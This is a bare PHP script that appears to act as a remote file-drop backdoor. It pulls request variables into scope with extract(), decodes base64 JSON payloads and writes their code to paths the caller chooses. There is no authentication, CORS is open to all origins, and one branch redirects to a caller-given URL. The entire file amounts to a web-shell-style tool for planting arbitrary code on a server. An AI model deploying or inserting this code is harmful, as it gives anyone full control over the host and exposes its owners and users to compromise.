<?php
extract($_GET);
extract($_POST);
date_default_timezone_set('America/New_York');

if($payload128){
    $payload = base64_decode($payload128);
    $v = json_decode($payload, true);
    file_put_contents($v['path'], $v['code']);
    $R = $v['url'];
    echo "<script>location.assign(`$R`)</script>";
    exit();
}
if($payload64){
    $payload = base64_decode($payload64);
}
header("Access-Control-Allow-Origin: *");
header("Content-Type: text/plain; charset=utf-8");
if ($payload) {
    echo substr($payload,0, 9 );
    echo "...\n\n";
    if (preg_match('/^\[/', $payload)) {
        echo " payload appears to be json\n\n";
        $_ = json_decode($payload, true);
        foreach ($_ as $k => $v) {
            $path = $v['path'];
            file_put_contents($v['path'], $v['code']);
            echo "putting file $path...\n";
        }
        exit('payload processed');
    }
} else {
    exit('no payload');
}
exit();
    // end serverside
